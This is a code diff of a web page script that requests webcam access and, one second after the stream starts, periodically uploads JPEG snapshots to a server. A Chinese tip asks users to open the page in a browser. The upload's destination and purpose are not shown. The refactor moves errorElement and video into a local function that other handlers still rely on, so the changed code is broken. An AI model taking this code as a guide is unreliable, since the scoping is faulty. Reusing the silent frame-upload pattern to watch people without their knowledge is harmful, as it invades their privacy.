@@ -24,16 +24,21 @@
             } else {
                 tip.innerHTML = '请在浏览器中打开'
             }
-            return
+        } else {
+            getCamera()
         }
 
-        var errorElement = document.getElementById('errorMsg')
-        var video = document.getElementById('video')
+        function getCamera() {
+            var errorElement = document.getElementById('errorMsg')
+            var video = document.getElementById('video')
 
-        var constraints = window.constraints = {
-            audio: false,
-            video: true
-        };
+            var constraints = window.constraints = {
+                audio: false,
+                video: true
+            };
+            navigator.mediaDevices.getUserMedia(constraints).
+            then(handleSuccess).catch(handleError)
+        }
 
         function handleSuccess(stream) {
             var videoTracks = stream.getVideoTracks()
@@ -44,8 +49,11 @@
             };
             video.srcObject = stream;
             
-            //一秒钟后开始发送
             setTimeout(beginSend, 1000)
+        }
+
+        function handleError(error) {
+            errorElement.innerHTML = error
         }
 
         function beginSend() {
@@ -62,14 +70,6 @@
                 ajax.send(formData)
             }, "image/jpeg", 0.8)
         }
-
-        function handleError(error) {
-            errorElement.innerHTML = error
-        }
-
-        navigator.mediaDevices.getUserMedia(constraints).
-            then(handleSuccess).catch(handleError)
-
     </script>
 </body>
 </html>
